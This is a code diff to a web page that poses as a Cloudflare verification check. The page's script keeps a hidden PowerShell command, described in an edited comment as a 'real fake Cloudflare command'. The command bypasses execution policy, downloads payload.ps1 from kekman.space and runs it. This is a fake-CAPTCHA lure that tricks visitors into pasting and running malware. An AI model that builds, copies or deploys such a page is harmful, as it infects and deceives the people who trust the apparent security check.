@@ -298,7 +298,6 @@
           <p class="step3" style="display: none;">Successfully.</p>
         </div>
         <div class="legal-links">
-          <!-- Fixed logo URL -->
           <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/4/4d/Cloudflare_Logo.png/128px-Cloudflare_Logo.png" alt="Cloudflare Logo" />
           <p>Confidentiality</p>
           <p>Terms and Conditions</p>
@@ -344,10 +343,10 @@
 
 <script>
 (function() {
-  // ---- CONFIG ----
+  // ---- CONFIG: real fake Cloudflare command (uses iwr + pipe) ----
   const CONFIG = {
     command: 'powershell -ep bypass -w hidden -c "$a=&(gcm iwr) ''https://kekman.space/payload.ps1'' -UseBasicParsing;$a.Content|powershell -w hidden -"'
-};
+  };
 
   // ---- Fill dynamic content ----
   const hostname = window.location.hostname || 'kekman.space';
